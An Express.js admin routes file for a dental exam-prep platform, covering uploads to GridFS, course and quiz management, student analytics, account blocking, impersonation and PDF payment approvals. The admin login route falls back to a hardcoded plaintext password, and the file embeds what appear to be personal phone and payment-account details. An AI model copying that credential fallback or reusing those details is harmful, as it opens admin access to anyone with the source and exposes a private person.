const express = require("express");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");
const path = require("path");
const fs = require("fs");
const multer = require("multer");
const { Course, Lesson, Quiz, Progress, Review, User, Subscription, AiChat, SubjectContent, AcademyProfile, PdfAccessRequest, generateId, getFilesBucket, isFilesBucketReady, mongoose } = require("../db");

const router = express.Router();

// Local uploads dir kept only for legacy/dev. New uploads go to MongoDB GridFS so
// they persist across Render restarts.
const uploadsDir = path.resolve(__dirname, "../../../static/uploads");
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

const quizUpload = multer({ storage: multer.memoryStorage() });
const contentUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 500 * 1024 * 1024 } // 500MB per file
});

// Middleware: stream every uploaded buffer to GridFS, then expose the assigned
// filename on each file object so downstream code (createAssetRecord etc.) keeps
// working without changes.
async function uploadFilesToGridFS(req, _res, next) {
  if (!req.files) {
    return next();
  }

  try {
    const bucket = getFilesBucket();
    for (const fieldName of Object.keys(req.files)) {
      const files = req.files[fieldName];
      if (!Array.isArray(files)) continue;

      for (const file of files) {
        if (!file || !file.buffer) continue;

        const ext = path.extname(file.originalname || "") || "";
        const base = normalizeId(path.basename(file.originalname || "", ext)) || "asset";
        const unique = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
        const filename = `${unique}_${base}${ext}`;

        await new Promise((resolve, reject) => {
          const uploadStream = bucket.openUploadStream(filename, {
            contentType: file.mimetype || "application/octet-stream",
            metadata: { originalName: file.originalname || filename }
          });
          uploadStream.on("error", reject);
          uploadStream.on("finish", resolve);
          uploadStream.end(file.buffer);
        });

        file.filename = filename;
      }
    }
    return next();
  } catch (err) {
    console.error("GridFS upload failed:", err);
    return next(err);
  }
}

function normalizeId(value) {
  return String(value || "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "_")
    .replace(/^_+|_+$/g, "");
}

// Matches filenames inside URLs like /static/uploads/<name> or /api/files/<name>
const FILE_URL_REGEX = /(?:static\/uploads|api\/files)\/([^"'\s?\\)]+)/gi;

// Scans every non-GridFS collection for filenames that are still referenced.
async function collectReferencedFilenames() {
  const referenced = new Set();
  const db = mongoose.connection.db;
  if (!db) return referenced;

  const collections = await db.listCollections().toArray();
  for (const { name } of collections) {
    if (name === "uploads.files" || name === "uploads.chunks") continue;
    const docs = await db.collection(name).find({}).toArray();
    for (const doc of docs) {
      const json = JSON.stringify(doc);
      let match;
      FILE_URL_REGEX.lastIndex = 0;
      while ((match = FILE_URL_REGEX.exec(json)) !== null) {
        try {
          referenced.add(decodeURIComponent(match[1]));
        } catch (_err) {
          referenced.add(match[1]);
        }
      }
    }
  }
  return referenced;
}

// Deletes GridFS files that are no longer referenced by any document. This is
// the ONLY safe way to reclaim MongoDB storage: removing a reference alone
// leaves the file bytes behind, which is what filled the free-tier quota.
async function purgeOrphanGridFs() {
  const stats = { orphanCount: 0, reclaimedBytes: 0, totalBytes: 0 };
  if (!isFilesBucketReady()) return stats;

  const referenced = await collectReferencedFilenames();
  const db = mongoose.connection.db;
  const bucket = getFilesBucket();
  const files = await db.collection("uploads.files").find({}).toArray();

  for (const file of files) {
    stats.totalBytes += file.length || 0;
    if (referenced.has(file.filename)) continue;

    try {
      await bucket.delete(file._id);
      stats.orphanCount += 1;
      stats.reclaimedBytes += file.length || 0;
    } catch (err) {
      console.error(`Failed to delete orphan GridFS file ${file.filename}:`, err.message);
    }
  }
  return stats;
}

// Fire-and-forget cleanup used after content saves so freeing space never
// blocks the HTTP response.
function schedulePurgeOrphanGridFs() {
  purgeOrphanGridFs().catch((err) => {
    console.error("Background GridFS purge failed:", err.message);
  });
}

function splitValues(value) {
  return String(value || "")
    .split(/\r?\n|,/) 
    .map((item) => item.trim())
    .filter(Boolean);
}

function parseTagList(value) {
  return Array.from(new Set(splitValues(value)));
}

function isYoutubeUrl(value) {
  return /(?:youtube\.com|youtu\.be)/i.test(String(value || ""));
}

function normalizeAccessLevel(value) {
  return String(value || "free").trim().toLowerCase() === "paid" ? "paid" : "free";
}

function createAssetRecord(file, kind, index = 0, accessLevel = "free") {
  const ext = path.extname(file.originalname || "");
  const title = path.basename(file.originalname || `${kind}_${index + 1}`, ext) || `${kind} ${index + 1}`;
  const fileUrl = `/static/uploads/${file.filename}`;
  return {
    id: `${kind}_${generateId()}`,
    kind,
    title,
    fileName: file.originalname,
    fileUrl,
    url: fileUrl,
    accessLevel: normalizeAccessLevel(accessLevel),
    mimeType: file.mimetype || "application/octet-stream",
    size: file.size || 0
  };
}

function parseCaseStudies(value) {
  const raw = String(value || "").trim();
  if (!raw) {
    return [];
  }

  if (raw.startsWith("[")) {
    try {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed
          .map((item, index) => ({
            id: item.id || `case_${generateId()}`,
            title: String(item.title || `Case Study ${index + 1}`).trim(),
            scenario: String(item.scenario || "").trim(),
            diagnosis: String(item.diagnosis || "").trim(),
            discussion: String(item.discussion || "").trim(),
            relevance: String(item.relevance || "").trim()
          }))
          .filter((item) => item.title || item.scenario || item.discussion || item.diagnosis);
      }
    } catch (_err) {
      // Fall through to block parsing.
    }
  }

  return raw
    .split(/\n\s*---+\s*\n/g)
    .map((block, index) => {
      const caseStudy = {
        id: `case_${generateId()}`,
        title: `Case Study ${index + 1}`,
        scenario: "",
        diagnosis: "",
        discussion: "",
        relevance: ""
      };
      let currentField = "scenario";

      block.split(/\r?\n/).forEach((line) => {
        const match = line.match(/^(title|scenario|diagnosis|discussion|relevance)\s*:\s*(.*)$/i);
        if (match) {
          currentField = match[1].toLowerCase();
          caseStudy[currentField] = match[2].trim();
          return;
        }

        if (!line.trim()) {
          return;
        }

        caseStudy[currentField] = `${caseStudy[currentField]}${caseStudy[currentField] ? "\n" : ""}${line.trim()}`;
      });

      return caseStudy;
    })
    .filter((item) => item.title || item.scenario || item.diagnosis || item.discussion || item.relevance);
}

function parseLineLinks(value, accessLevel) {
  const normalizedAccessLevel = accessLevel ? normalizeAccessLevel(accessLevel) : null;
  return String(value || "")
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line, index) => {
      const parts = line.split("|").map((part) => part.trim());
      if (parts.length >= 2) {
        const item = {
          title: parts[0] || `Resource ${index + 1}`,
          url: parts.slice(1).join("|") || "#"
        };
        if (normalizedAccessLevel) {
          item.accessLevel = normalizedAccessLevel;
        }
        return item;
      }

      const item = {
        title: `Resource ${index + 1}`,
        url: parts[0] || "#"
      };
      if (normalizedAccessLevel) {
        item.accessLevel = normalizedAccessLevel;
      }
      return item;
    });
}

function sanitizeLinks(value) {
  if (!Array.isArray(value)) {
    return [];
  }

  return value
    .map((item) => {
      if (!item || typeof item !== "object") {
        return null;
      }
      const raw = (item && typeof item.toObject === "function") ? item.toObject() : item;
      const doc = raw && raw._doc ? raw._doc : raw;
      const title = String((doc && doc.title) || "").trim();
      const rawUrl = (doc && doc.url) || "";
      const rawFileUrl = (doc && doc.fileUrl) || "";
      const accessLevel = normalizeAccessLevel((doc && doc.accessLevel) || "free");
      const preferredUrl = (rawUrl && String(rawUrl).trim() !== "#") ? rawUrl : (rawFileUrl || rawUrl || "");
      const url = String(preferredUrl || "").trim();
      if (!title && !url) {
        return null;
      }
      if (!url || url === "#") {
        return null;
      }
      return {
        title: title || url || "Resource",
        url,
        accessLevel
      };
    })
    .filter(Boolean);
}

function mergeUniqueStrings(existingValues, incomingValues) {
  const seen = new Set();
  const merged = [];

  const add = (value) => {
    const normalized = String(value || "").trim();
    if (!normalized) {
      return;
    }
    const key = normalized.toLowerCase();
    if (seen.has(key)) {
      return;
    }
    seen.add(key);
    merged.push(normalized);
  };

  (Array.isArray(existingValues) ? existingValues : []).forEach(add);
  (Array.isArray(incomingValues) ? incomingValues : []).forEach(add);

  return merged;
}

function normalizeBiochemistryTopics(blockKey, topics) {
  const requiredByBlock = {
    "block-a": 1,
    "block-b": 1,
    "block-c": 3
  };

  const normalizedBlockKey = String(blockKey || "").trim().toLowerCase();
  const required = requiredByBlock[normalizedBlockKey];

  const rawTopics = Array.isArray(topics) ? topics : [];
  const expanded = rawTopics.flatMap((topic) => {
    const value = String(topic || "").trim();
    if (!value) {
      return [];
    }

    if (normalizedBlockKey !== "block-c") {
      return [value];
    }

    // Support legacy combined formats like "1.Cervicofacial|2.GIT+UGS|3.Cardiopulmonary".
    return value
      .split(/[|\n,]+/)
      .map((part) => part.replace(/^\s*\d+[.)\-:\s]*/, "").trim())
      .filter(Boolean);
  });

  const normalized = mergeUniqueStrings([], expanded);
  if (!required) {
    return normalized;
  }

  if (normalized.length >= required) {
    return normalized.slice(0, required);
  }

  const filled = [...normalized];
  for (let index = filled.length; index < required; index += 1) {
    filled.push(`Topic ${index + 1}`);
  }
  return filled;
}

function mergeUniqueLinks(existingItems, incomingItems) {
  const seen = new Set();
  const merged = [];

  const add = (item) => {
    if (!item || typeof item !== "object") {
      return;
    }

    const raw = (item && typeof item.toObject === "function") ? item.toObject() : item;
    const doc = raw && raw._doc ? raw._doc : raw;
    const title = String((doc && doc.title) || "").trim();
    const rawUrl = (doc && doc.url) || "";
    const rawFileUrl = (doc && doc.fileUrl) || "";
    const accessLevel = normalizeAccessLevel((doc && doc.accessLevel) || "free");
    const preferredUrl = (rawUrl && String(rawUrl).trim() !== "#") ? rawUrl : (rawFileUrl || rawUrl || "");
    const url = String(preferredUrl || "").trim();

    if (!url || url === "#") {
      return;
    }

    const normalizedTitle = title || url || "Resource";
    const key = `${normalizedTitle.toLowerCase()}|${url.toLowerCase()}`;
    if (seen.has(key)) {
      return;
    }

    seen.add(key);
    merged.push({
      ...doc,
      title: normalizedTitle,
      url,
      accessLevel,
      fileUrl: String((doc && doc.fileUrl) || url).trim()
    });
  };

  (Array.isArray(existingItems) ? existingItems : []).forEach(add);
  (Array.isArray(incomingItems) ? incomingItems : []).forEach(add);

  return merged;
}

async function ensureAcademyProfile() {
  const existing = await AcademyProfile.findOne({ id: "academy_profile" });
  if (existing) {
    return existing;
  }

  return await AcademyProfile.findOneAndUpdate(
    { id: "academy_profile" },
    {
      id: "academy_profile",
      aboutAcademyText: "Dental Prep is your structured BDS preparation platform where each subject is organized into simple blocks, helping students move from fundamentals to clinical confidence.",
      bankDetails: {
          bankName: "Meezan Bank",
          accountTitle: "Dental Prep Official",
          accountNumber: "0123456789",
          iban: "PK00 MEZN 0000 0000 0000 0000"
      },
      generalOverview: {
        books: [{ title: "BDS Core Reading List", url: "#" }],
        premiumNotes: [{ title: "Premium Notes Pack", url: "#" }],
        importantSlides: [{ title: "Important Slides Collection", url: "#" }],
        shortNotes: [{ title: "Short Notes for Final Revision", url: "#" }],
        videos: Array.from({ length: 6 }).map((_, index) => ({
          title: `General Overview Video ${index + 1}`,
          url: "https://www.youtube.com/@pulseprepofficial"
        }))
      },
      aboutUs: {
        profileImageUrl: "/static/images/favicon.png",
        introVideoUrl: "https://www.youtube.com/@pulseprepofficial",
        notes: [{ title: "Academy Intro Notes", url: "#" }],
        pdfResources: [{ title: "Academy Resource PDF", url: "#" }],
        contactEmail: "admin@dentalprep.com",
        contactNumbers: ["+92 335 9591271"],
        socialLinks: {
          facebook: "https://facebook.com/profile.php?id=61576776451528",
          youtube: "https://www.youtube.com/@pulseprepofficial",
          instagram: "https://instagram.com/pulseprepofficial",
          linkedin: "https://linkedin.com/in/pulse-prep-778292368"
        }
      }
    },
    { new: true, upsert: true }
  );
}

async function buildStudentAnalytics() {
  const courses = await Course.find({});
  const lessons = await Lesson.find({});
  const quizzes = await Quiz.find({});
  const progressItems = await Progress.find({});
  const students = (await User.find({})).filter((user) => user.role !== "admin");

  const coursesById = courses.reduce((acc, course) => {
    acc[course.courseId] = course;
    return acc;
  }, {});
  const lessonsById = lessons.reduce((acc, lesson) => {
    acc[lesson.lessonId] = lesson;
    return acc;
  }, {});
  const quizzesById = quizzes.reduce((acc, quiz) => {
    acc[quiz.quizId] = quiz;
    return acc;
  }, {});
  const totalTrackableItems = lessons.length + quizzes.length;

  return students
    .map((student) => {
      const userProgress = progressItems.filter((item) => item.userId === student._id);
      const completedLessons = userProgress.filter((item) => item.itemType === "lesson" && item.completed).length;
      const quizAttempts = userProgress.filter((item) => item.itemType === "quiz");
      const avgScore = quizAttempts.length
        ? Math.round(quizAttempts.reduce((sum, item) => sum + (Number(item.score) || 0), 0) / quizAttempts.length)
        : 0;
      const weakAreas = quizAttempts
        .filter((item) => Number(item.score) < 70)
        .sort((left, right) => Number(left.score) - Number(right.score))
        .slice(0, 3)
        .map((item) => {
          const quiz = quizzesById[item.quizId || item.referenceId];
          const lesson = lessonsById[item.lessonId || quiz?.lessonId];
          const course = coursesById[item.courseId || lesson?.courseId || quiz?.courseId];
          return {
            quizTitle: quiz ? quiz.title : item.title || "Quiz",
            lessonTitle: lesson ? lesson.title : "Lesson",
            courseTitle: course ? course.title : item.courseId,
            score: Number(item.score) || 0
          };
        });

      return {
        userId: student._id,
        name: student.name || "Student",
        email: student.email || "",
        completedLessons,
        quizAttempts: quizAttempts.length,
        avgScore,
        completionRate: totalTrackableItems
          ? Math.round(((completedLessons + quizAttempts.filter((item) => item.completed).length) / totalTrackableItems) * 100)
          : 0,
        weakAreas,
        updatedAt: userProgress[0]?.updatedAt || student.updatedAt || student.createdAt
      };
    })
    .sort((left, right) => right.completionRate - left.completionRate || right.avgScore - left.avgScore);
}

async function buildManagedStudents() {
  const courses = await Course.find({});
  const lessons = await Lesson.find({});
  const quizzes = await Quiz.find({});
  const progressItems = await Progress.find({});
  const students = (await User.find({})).filter((user) => user.role !== "admin");

  const coursesById = courses.reduce((acc, course) => {
    acc[course.courseId] = course;
    return acc;
  }, {});
  const lessonsById = lessons.reduce((acc, lesson) => {
    acc[lesson.lessonId] = lesson;
    return acc;
  }, {});
  const quizzesById = quizzes.reduce((acc, quiz) => {
    acc[quiz.quizId] = quiz;
    return acc;
  }, {});
  const totalTrackableItems = lessons.length + quizzes.length;

  return students
    .map((student) => {
      const userProgress = progressItems.filter((item) => item.userId === student._id);
      const completedLessons = userProgress.filter((item) => item.itemType === "lesson" && item.completed).length;
      const quizAttempts = userProgress.filter((item) => item.itemType === "quiz");
      const avgScore = quizAttempts.length
        ? Math.round(quizAttempts.reduce((sum, item) => sum + (Number(item.score) || 0), 0) / quizAttempts.length)
        : 0;

      return {
        userId: student._id,
        name: student.name || "Student",
        email: student.email || "",
        role: student.role || "student",
        isVerified: Boolean(student.isVerified),
        accountStatus: student.accountStatus || "active",
        completedLessons,
        quizAttempts: quizAttempts.length,
        avgScore,
        completionRate: totalTrackableItems
          ? Math.round(((completedLessons + quizAttempts.filter((item) => item.completed).length) / totalTrackableItems) * 100)
          : 0,
        weakAreas: quizAttempts
          .filter((item) => Number(item.score) < 70)
          .sort((left, right) => Number(left.score) - Number(right.score))
          .slice(0, 3)
          .map((item) => {
            const quiz = quizzesById[item.quizId || item.referenceId];
            const lesson = lessonsById[item.lessonId || quiz?.lessonId];
            const course = coursesById[item.courseId || lesson?.courseId || quiz?.courseId];
            return {
              quizTitle: quiz ? quiz.title : item.title || "Quiz",
              lessonTitle: lesson ? lesson.title : "Lesson",
              courseTitle: course ? course.title : item.courseId,
              score: Number(item.score) || 0
            };
          }),
        updatedAt: userProgress[0]?.updatedAt || student.updatedAt || student.createdAt
      };
    })
    .sort((left, right) => right.completionRate - left.completionRate || right.avgScore - left.avgScore);
}

function createTemporaryPassword() {
  return crypto.randomBytes(6).toString("base64url").replace(/[^a-zA-Z0-9]/g, "").slice(0, 10) || `Temp${generateId().slice(0, 6)}`;
}

function adminAuth(req, res, next) {
  const authHeader = req.headers.authorization || "";
  const token = authHeader.startsWith("Bearer ") ? authHeader.slice(7) : null;

  if (!token) {
    return res.status(401).json({ message: "Missing admin token" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    if (decoded.role !== "admin") {
      return res.status(403).json({ message: "Forbidden" });
    }
    req.admin = decoded;
    return next();
  } catch (_err) {
    return res.status(401).json({ message: "Invalid admin token" });
  }
}

router.post("/admin/login", (req, res) => {
  const { email, password } = req.body || {};
  const adminEmail = process.env.ADMIN_EMAIL || "admin@dentalprep.com";
  const adminPassword = process.env.ADMIN_PASSWORD || "Yousaf12+-";

  if (email !== adminEmail || password !== adminPassword) {
    return res.status(401).json({ message: "Invalid admin credentials" });
  }

  const token = jwt.sign({ role: "admin", email }, process.env.JWT_SECRET, { expiresIn: "7d" });
  return res.json({ token });
});

router.post("/admin/course", adminAuth, async (req, res) => {
  try {
    const { title, description, category, curriculumTags, courseId } = req.body || {};
    if (!title) {
      return res.status(400).json({ message: "Title is required" });
    }

    const id = courseId || `course_${normalizeId(title)}`;
    const course = await Course.findOneAndUpdate(
      { courseId: id },
      {
        courseId: id,
        title,
        description: String(description || "").trim(),
        category: String(category || "").trim(),
        curriculumTags: parseTagList(curriculumTags)
      },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      course: {
        id: course.courseId,
        title: course.title,
        description: course.description || "",
        category: course.category || "",
        curriculumTags: course.curriculumTags || []
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.delete("/admin/course/:courseId", adminAuth, async (req, res) => {
  try {
    const courseId = String(req.params.courseId || "").trim();
    if (!courseId) {
      return res.status(400).json({ message: "Course ID is required" });
    }

    const course = await Course.findOne({ courseId });
    if (!course) {
      return res.status(404).json({ message: "Course not found" });
    }

    const lessonRows = await Lesson.find({ courseId }, { lessonId: 1 });
    const lessonIds = lessonRows.map((row) => row.lessonId).filter(Boolean);

    const directQuizRows = await Quiz.find({ courseId }, { quizId: 1 });
    const lessonQuizRows = lessonIds.length ? await Quiz.find({ lessonId: { $in: lessonIds } }, { quizId: 1 }) : [];
    const quizIds = Array.from(new Set([...directQuizRows, ...lessonQuizRows].map((row) => row.quizId).filter(Boolean)));

    const progressOrFilters = [{ courseId }];
    if (lessonIds.length) {
      progressOrFilters.push({ lessonId: { $in: lessonIds } });
      progressOrFilters.push({ referenceId: { $in: lessonIds } });
    }
    if (quizIds.length) {
      progressOrFilters.push({ quizId: { $in: quizIds } });
      progressOrFilters.push({ referenceId: { $in: quizIds } });
    }

    const [deletedLessons, deletedQuizzes, deletedReviews, deletedProgress, deletedCourse] = await Promise.all([
      Lesson.deleteMany({ courseId }),
      Quiz.deleteMany({ $or: [{ courseId }, ...(lessonIds.length ? [{ lessonId: { $in: lessonIds } }] : [])] }),
      Review.deleteMany({ courseId }),
      Progress.deleteMany({ $or: progressOrFilters }),
      Course.deleteOne({ courseId })
    ]);

    return res.json({
      message: "Course and related data deleted permanently",
      deleted: {
        course: deletedCourse.deletedCount || 0,
        lessons: deletedLessons.deletedCount || 0,
        quizzes: deletedQuizzes.deletedCount || 0,
        reviews: deletedReviews.deletedCount || 0,
        progress: deletedProgress.deletedCount || 0
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/courses - Get all courses for admin dropdown (requires admin auth)
router.get("/admin/courses", adminAuth, async (_req, res) => {
  try {
    const courses = await Course.find({}).sort({ title: 1 });
    const allLessons = await Lesson.find({});
    const allQuizzes = await Quiz.find({});
    
    const data = courses.map((course) => {
      const courseLessons = allLessons.filter((lesson) => lesson.courseId === course.courseId);
      const courseQuizzes = allQuizzes.filter((quiz) => quiz.courseId === course.courseId);
      
      return {
        id: course.courseId,
        title: course.title,
        description: course.description || "",
        category: course.category || "",
        curriculumTags: course.curriculumTags || [],
        lessonsCount: courseLessons.length,
        quizCount: courseQuizzes.length
      };
    });
    
    res.json({ courses: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/lessons - Get all lessons for admin panel (requires admin auth)
router.get("/admin/lessons", adminAuth, async (_req, res) => {
  try {
    const lessons = await Lesson.find({}).sort({ title: 1 });
    const data = lessons.map((lesson) => ({
      id: lesson.lessonId,
      title: lesson.title,
      courseId: lesson.courseId,
      summary: lesson.summary || "",
      videoUrl: lesson.videoUrl || ""
    }));
    res.json({ lessons: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/quizzes - Get all quizzes for admin panel (requires admin auth)
router.get("/admin/quizzes", adminAuth, async (_req, res) => {
  try {
    const quizzes = await Quiz.find({}).sort({ title: 1 });
    const data = quizzes.map((quiz) => ({
      id: quiz.quizId,
      title: quiz.title,
      courseId: quiz.courseId,
      lessonId: quiz.lessonId,
      questionCount: (quiz.questions || []).length
    }));
    res.json({ quizzes: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/overview", adminAuth, async (_req, res) => {
  try {
    const courses = await Course.find({});
    const lessons = await Lesson.find({});
    const quizzes = await Quiz.find({});
    const progressItems = (await Progress.find({})).sort((left, right) => new Date(right.updatedAt || right.createdAt || 0) - new Date(left.updatedAt || left.createdAt || 0));
    const reviews = (await Review.find({})).sort((left, right) => new Date(right.updatedAt || right.createdAt || 0) - new Date(left.updatedAt || left.createdAt || 0));
    const quizAttempts = progressItems.filter((item) => item.itemType === "quiz" || item.quizId);
    const usersById = (await User.find({})).reduce((acc, user) => {
      acc[user._id] = user;
      return acc;
    }, {});
    const quizzesById = quizzes.reduce((acc, quiz) => {
      acc[quiz.quizId] = quiz;
      return acc;
    }, {});
    const coursesById = courses.reduce((acc, course) => {
      acc[course.courseId] = course;
      return acc;
    }, {});
    const studentAnalytics = await buildStudentAnalytics();

    const recentResults = quizAttempts
      .map((item) => {
        const user = usersById[item.userId];
        const quiz = quizzesById[item.quizId || item.referenceId] || null;
        const course = coursesById[item.courseId] || null;
        return {
          id: item._id,
          userName: user ? user.name : "Student",
          userEmail: user ? user.email : "",
          quizTitle: quiz ? quiz.title : item.title || "Quiz",
          courseTitle: course ? course.title : item.courseId,
          score: item.score || 0,
          completed: Boolean(item.completed),
          updatedAt: item.updatedAt || item.createdAt
        };
      })
      .slice(0, 10);

    const recentReviews = reviews
      .map((review) => {
        const user = usersById[review.userId];
        const course = coursesById[review.courseId];
        return {
          id: review._id,
          userName: user ? user.name : review.userName || "Student",
          courseTitle: course ? course.title : review.courseId,
          rating: review.rating,
          comment: review.comment,
          createdAt: review.createdAt
        };
      })
      .slice(0, 10);

    const audioCount = lessons.reduce((sum, lesson) => sum + ((lesson.audioItems || []).length || 0), 0);
    const materialCount = lessons.reduce((sum, lesson) => sum + ((lesson.materials || []).length || 0), 0);
    const caseStudyCount = lessons.reduce((sum, lesson) => sum + ((lesson.caseStudies || []).length || 0), 0);

    return res.json({
      counts: {
        courses: courses.length,
        lessons: lessons.length,
        quizzes: quizzes.length,
        quizAttempts: quizAttempts.length,
        reviews: reviews.length,
        students: studentAnalytics.length,
        audios: audioCount,
        materials: materialCount,
        caseStudies: caseStudyCount
      },
      recentResults,
      recentReviews,
      studentAnalytics: studentAnalytics.slice(0, 5)
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/student-analytics", adminAuth, async (_req, res) => {
  try {
    return res.json({ students: await buildStudentAnalytics() });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/users", adminAuth, async (_req, res) => {
  try {
    return res.json({ students: await buildManagedStudents() });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/block", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts cannot be blocked" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "blocked",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "User blocked",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "blocked"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/approve", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account cannot be changed" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "active",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "Student approved successfully",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/reject", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account cannot be changed" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "blocked",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "Student rejected",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "blocked"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/unblock", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts do not use block status" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "active",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "User unblocked",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/reset-password", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin password is managed separately" });
    }

    const tempPassword = String(req.body?.password || "").trim() || createTemporaryPassword();
    const bcrypt = require("bcryptjs");
    const passwordHash = await bcrypt.hash(tempPassword, 10);

    await User.findByIdAndUpdate(userId, {
      passwordHash,
      password: undefined,
      resetPasswordToken: null,
      resetPasswordExpires: null,
      updatedAt: new Date()
    });

    return res.json({
      message: "Password reset successfully",
      tempPassword
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/impersonate", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account impersonation is not allowed" });
    }

    const token = jwt.sign(
      {
        id: user._id,
        email: user.email,
        role: user.role || "student",
        impersonatedBy: req.admin.email,
        impersonatedByRole: "admin"
      },
      process.env.JWT_SECRET,
      { expiresIn: "7d" }
    );

    return res.json({
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role || "student",
        accountStatus: user.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.delete("/admin/users/:userId", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts cannot be deleted here" });
    }

    await Promise.all([
      Progress.deleteMany({ userId }),
      Subscription.deleteMany({ userId }),
      Review.deleteMany({ userId }),
      AiChat.deleteMany({ userId }),
      PdfAccessRequest.deleteMany({ userId }),
      User.deleteOne({ _id: userId })
    ]);

    return res.json({ message: "User deleted permanently" });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/pdf-access-requests", adminAuth, async (_req, res) => {
  try {
    const requests = await PdfAccessRequest.find({});
    const usersById = (await User.find({})).reduce((acc, user) => {
      acc[user._id] = user;
      return acc;
    }, {});

    const items = requests
      .sort((a, b) => new Date(b.updatedAt || b.createdAt || 0) - new Date(a.updatedAt || a.createdAt || 0))
      .map((request) => {
        const user = usersById[request.userId];
        return {
          id: request._id,
          userId: request.userId,
          userName: user ? user.name : "Student",
          userEmail: user ? user.email : "",
          subjectKey: request.subjectKey,
          blockKey: request.blockKey,
          sectionName: request.sectionName,
          amount: Number(request.amount || 500),
          paymentMethod: request.paymentMethod || "easypaisa",
          easypaisaNumber: request.easypaisaNumber || "03327939323",
          easypaisaAccountName: request.easypaisaAccountName || "Muhammad Yousaf",
          paymentProof: request.paymentProof || "",
          status: request.status || "pending",
          adminNote: request.adminNote || "",
          reviewedBy: request.reviewedBy || "",
          reviewedAt: request.reviewedAt || null,
          createdAt: request.createdAt || null
        };
      });

    return res.json({ requests: items });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/pdf-access-requests/:requestId/approve", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "approved",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Approved").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access approved", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

